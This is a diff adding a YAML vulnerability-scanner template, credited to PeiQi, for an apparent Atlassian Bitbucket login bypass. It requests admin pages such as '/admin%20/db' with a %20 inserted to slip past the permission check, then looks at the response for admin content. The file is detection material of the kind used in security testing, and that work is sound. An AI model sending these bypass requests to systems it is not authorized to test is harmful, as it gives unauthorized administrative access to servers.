@@ -1,0 +1,22 @@
+name: bitbucket-login-bypass
+groups:
+  path1:
+    - method: GET
+      path: "/admin%20/mail-server"
+      expression: |
+        response.status == 200 && (response.body.bcontains(b"Mail Server") || response.body.bcontains(b"admin"))
+  path2:
+    - method: GET
+      path: "/admin%20/db"
+      expression: |
+        response.status == 200 && (response.body.bcontains(b"Database") || response.body.bcontains(b"admin"))
+  path3:
+    - method: GET
+      path: "/admin%20/server-settings"
+      expression: |
+        response.status == 200 && (response.body.bcontains(b"Server Settings") || response.body.bcontains(b"admin"))
+detail:
+  author: PeiQi
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "Atlassian Bitbucket 登录绕过漏洞，通过 %20 绕过权限验证"
